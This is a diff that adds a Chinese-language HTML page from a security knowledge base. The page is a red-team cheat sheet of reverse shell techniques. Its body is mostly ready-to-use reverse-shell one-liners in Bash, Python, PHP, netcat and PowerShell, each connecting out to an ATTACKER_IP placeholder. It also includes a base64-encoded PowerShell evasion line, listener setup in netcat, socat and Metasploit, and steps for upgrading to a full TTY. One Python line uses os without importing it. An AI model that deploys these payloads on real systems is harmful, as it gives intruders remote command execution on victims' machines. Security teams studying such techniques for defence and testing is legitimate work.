@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>反弹Shell技术大全与免杀绕过 - XHSecTeam安全知识库</title>
+    <meta name="description" content="汇总各种反弹Shell的方法，包括Bash、Python、PHP、PowerShell等，以及绕过防火墙和杀软检测的技巧。">
+    <meta name="keywords" content="反弹Shell,Reverse Shell,后渗透,免杀,Bash,PowerShell,PHP,Python">
+    <meta name="author" content="XHSecTeam">
+    <meta name="robots" content="index, follow">
+    
+    <link rel="stylesheet" href="../../static/css/common.css">
+    <script src="../../static/css/common.js"></script>
+    <script src="../../static/js/layout.js"></script>
+    <style>
+        .article-container { max-width: 1200px; margin: 0 auto; padding: 24px 32px 60px; }
+        .article-layout { display: grid; grid-template-columns: 1fr 280px; gap: 40px; }
+        .article-header { margin-bottom: 32px; }
+        .article-breadcrumb { display: flex; align-items: center; gap: 8px; font-size: 13px; color: var(--text-tertiary); margin-bottom: 16px; }
+        .article-breadcrumb a { color: var(--text-secondary); text-decoration: none; }
+        .article-breadcrumb a:hover { color: var(--accent-green); }
+        .article-breadcrumb svg { width: 14px; height: 14px; fill: none; stroke: currentColor; stroke-width: 2; }
+        .article-title { font-size: 32px; font-weight: 800; color: var(--text-primary); line-height: 1.3; margin-bottom: 16px; }
+        .article-meta { display: flex; align-items: center; gap: 20px; flex-wrap: wrap; font-size: 13px; color: var(--text-secondary); }
+        .article-meta-item { display: flex; align-items: center; gap: 6px; }
+        .article-meta-item svg { width: 16px; height: 16px; fill: none; stroke: currentColor; stroke-width: 2; color: var(--text-tertiary); }
+        .article-badge { padding: 3px 10px; border-radius: 999px; font-size: 12px; font-weight: 600; background: rgba(245, 158, 11, 0.1); color: #d97706; border: 1px solid rgba(245, 158, 11, 0.3); }
+        .article-tags { display: flex; gap: 8px; margin-top: 16px; flex-wrap: wrap; }
+        .article-tag { padding: 4px 12px; border-radius: 999px; font-size: 12px; background: rgba(59, 130, 246, 0.08); color: #3b82f6; border: 1px solid rgba(59, 130, 246, 0.2); text-decoration: none; }
+        .article-content { background: rgba(255, 255, 255, 0.96); border: 1px solid rgba(148, 163, 184, 0.2); border-radius: 16px; padding: 32px; }
+        .article-content h2 { font-size: 22px; font-weight: 700; color: var(--text-primary); margin: 32px 0 16px; padding-bottom: 10px; border-bottom: 2px solid rgba(16, 185, 129, 0.3); }
+        .article-content h2:first-child { margin-top: 0; }
+        .article-content h3 { font-size: 18px; font-weight: 600; color: var(--text-primary); margin: 24px 0 12px; }
+        .article-content p { font-size: 15px; line-height: 1.8; color: var(--text-secondary); margin-bottom: 16px; }
+        .article-content ul, .article-content ol { margin: 16px 0; padding-left: 24px; }
+        .article-content li { font-size: 15px; line-height: 1.8; color: var(--text-secondary); margin-bottom: 8px; }
+        .article-content code { background: rgba(16, 185, 129, 0.08); color: var(--accent-green); padding: 2px 8px; border-radius: 4px; font-family: 'SF Mono', Monaco, Consolas, monospace; font-size: 14px; }
+        .article-content pre { background: #1e293b; border-radius: 12px; padding: 20px; overflow-x: auto; margin: 20px 0; }
+        .article-content pre code { background: none; color: #e2e8f0; padding: 0; font-size: 13px; line-height: 1.6; }
+        .article-sidebar { display: flex; flex-direction: column; gap: 20px; }
+        .article-toc { background: rgba(255, 255, 255, 0.96); border: 1px solid rgba(148, 163, 184, 0.2); border-radius: 12px; padding: 20px; position: sticky; top: 24px; }
+        .article-toc-title { font-size: 14px; font-weight: 600; color: var(--text-primary); margin-bottom: 14px; }
+        .article-toc-list { display: flex; flex-direction: column; gap: 10px; }
+        .article-toc-item { font-size: 13px; color: var(--text-secondary); text-decoration: none; padding-left: 12px; border-left: 2px solid transparent; }
+        .article-toc-item:hover { color: var(--accent-green); }
+        .article-toc-item.sub { padding-left: 24px; font-size: 12px; }
+        .article-nav { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 40px; padding-top: 32px; border-top: 1px solid rgba(148, 163, 184, 0.2); }
+        .article-nav-item { padding: 20px; background: rgba(255, 255, 255, 0.96); border: 1px solid rgba(148, 163, 184, 0.2); border-radius: 12px; text-decoration: none; }
+        .article-nav-item:hover { border-color: var(--accent-green); }
+        .article-nav-label { font-size: 12px; color: var(--text-tertiary); margin-bottom: 6px; }
+        .article-nav-title { font-size: 14px; font-weight: 600; color: var(--accent-green); }
+        .article-nav-item.next { text-align: right; }
+        @media (max-width: 960px) { .article-layout { grid-template-columns: 1fr; } }
+    </style>
+</head>
+<body>
+    <div class="main-layout" style="margin-left: 0; margin-right: 0;">
+        <article class="content article-container" itemscope itemtype="https://schema.org/TechArticle">
+            <header class="article-header">
+                <nav class="article-breadcrumb">
+                    <a href="../index.html">知识库</a>
+                    <svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg>
+                    <a href="../index.html?cat=redteam">红队攻防</a>
+                    <svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg>
+                    <span>反弹Shell</span>
+                </nav>
+                <h1 class="article-title" itemprop="headline">反弹Shell技术大全与免杀绕过</h1>
+                <div class="article-meta">
+                    <span class="article-badge">中危</span>
+                    <div class="article-meta-item">
+                        <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+                        <time datetime="2024-12-12">2024-12-12</time>
+                    </div>
+                    <div class="article-meta-item">
+                        <svg viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+                        <span>1,234 阅读</span>
+                    </div>
+                </div>
+                <div class="article-tags">
+                    <a href="#" class="article-tag">反弹Shell</a>
+                    <a href="#" class="article-tag">后渗透</a>
+                    <a href="#" class="article-tag">免杀</a>
+                </div>
+            </header>
+            
+            <div class="article-layout">
+                <div class="article-content" itemprop="articleBody">
+                    <h2 id="intro">一、反弹Shell概述</h2>
+                    <p>反弹Shell（Reverse Shell）是一种让目标机器主动连接攻击者的技术。与正向Shell不同，反弹Shell可以绕过防火墙的入站限制，是后渗透阶段常用的技术手段。</p>
+                    
+                    <h2 id="bash">二、Bash反弹Shell</h2>
+                    <pre><code># 方法1: /dev/tcp
+bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
+
+# 方法2: 使用exec
+exec 5<>/dev/tcp/ATTACKER_IP/PORT;cat <&5 | while read line; do $line 2>&5 >&5; done
+
+# 方法3: 管道方式
+bash -c 'sh -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'</code></pre>
+                    
+                    <h2 id="python">三、Python反弹Shell</h2>
+                    <pre><code># Python 2/3 兼容
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+# Python PTY
+python -c 'import pty;import socket;s=socket.socket();s.connect(("ATTACKER_IP",PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'</code></pre>
+                    
+                    <h2 id="php">四、PHP反弹Shell</h2>
+                    <pre><code># 方法1: exec
+php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+# 方法2: proc_open
+php -r '$proc=proc_open("/bin/sh -i",array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w")),$pipes);'</code></pre>
+                    
+                    <h2 id="nc">五、Netcat反弹Shell</h2>
+                    <pre><code># 传统nc
+nc -e /bin/sh ATTACKER_IP PORT
+
+# 无-e参数版本
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f
+
+# ncat (带SSL加密)
+ncat --ssl ATTACKER_IP PORT -e /bin/bash</code></pre>
+                    
+                    <h2 id="powershell">六、PowerShell反弹Shell</h2>
+                    <pre><code># 基础PowerShell反弹
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+# Base64编码绕过
+powershell -enc BASE64_ENCODED_PAYLOAD</code></pre>
+                    
+                    <h2 id="listener">七、监听端设置</h2>
+                    <pre><code># Netcat监听
+nc -lvnp PORT
+
+# Socat监听
+socat TCP-LISTEN:PORT,reuseaddr FILE:`tty`,raw,echo=0
+
+# Metasploit监听
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST ATTACKER_IP
+set LPORT PORT
+run</code></pre>
+                    
+                    <h2 id="upgrade">八、Shell升级</h2>
+                    <p>获取反弹Shell后，通常需要升级为完整的交互式Shell：</p>
+                    <pre><code># Python方式
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+# 完整升级流程
+Ctrl+Z
+stty raw -echo; fg
+reset
+export SHELL=bash
+export TERM=xterm-256color
+stty rows 38 columns 116</code></pre>
+                </div>
+                
+                <aside class="article-sidebar">
+                    <nav class="article-toc">
+                        <h2 class="article-toc-title">目录</h2>
+                        <div class="article-toc-list">
+                            <a href="#intro" class="article-toc-item">一、反弹Shell概述</a>
+                            <a href="#bash" class="article-toc-item">二、Bash反弹Shell</a>
+                            <a href="#python" class="article-toc-item">三、Python反弹Shell</a>
+                            <a href="#php" class="article-toc-item">四、PHP反弹Shell</a>
+                            <a href="#nc" class="article-toc-item">五、Netcat反弹Shell</a>
+                            <a href="#powershell" class="article-toc-item">六、PowerShell反弹</a>
+                            <a href="#listener" class="article-toc-item">七、监听端设置</a>
+                            <a href="#upgrade" class="article-toc-item">八、Shell升级</a>
+                        </div>
+                    </nav>
+                </aside>
+            </div>
+            
+            <nav class="article-nav">
+                <a href="nmap-advanced-usage.html" class="article-nav-item prev">
+                    <div class="article-nav-label">← 上一篇</div>
+                    <div class="article-nav-title">Nmap高级扫描技术与实战应用</div>
+                </a>
+                <a href="burpsuite-complete-guide.html" class="article-nav-item next">
+                    <div class="article-nav-label">下一篇 →</div>
+                    <div class="article-nav-title">BurpSuite完全使用指南</div>
+                </a>
+            </nav>
+        </article>
+    </div>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', async function() {
+            XHLayout.loadFooter();
+        });
+    </script>
+</body>
+</html>
